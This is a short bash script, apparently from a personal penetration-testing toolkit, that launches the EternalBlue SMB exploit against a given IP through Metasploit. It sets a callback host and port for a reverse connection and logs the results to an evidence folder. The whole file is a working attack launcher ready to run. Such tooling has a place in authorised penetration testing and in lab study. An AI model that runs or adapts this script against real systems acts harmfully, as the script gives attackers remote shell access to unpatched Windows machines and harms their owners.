#!/bin/bash
# Launch EternalBlue attack via Metasploit

TARGET="$1"
LHOST="${2:-10.0.0.1}"
LPORT="${3:-4444}"

if [ -z "$TARGET" ]; then
    echo "Usage: start_eternalblue.sh <target_ip> [lhost] [lport]"
    exit 1
fi

SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts/internal/msf"
LOG_DIR="/home/ov3rr1d3/wifi_arsenal/captures/evidence/$TARGET"
mkdir -p "$LOG_DIR"

echo "[*] Launching EternalBlue against $TARGET"
echo "[*] Callback: $LHOST:$LPORT"

# Export for msfconsole
export TARGET LHOST LPORT

# Run Metasploit with resource file
msfconsole -q -r "$SCRIPT_DIR/eternalblue.rc" 2>&1 | tee "$LOG_DIR/eternalblue.log"
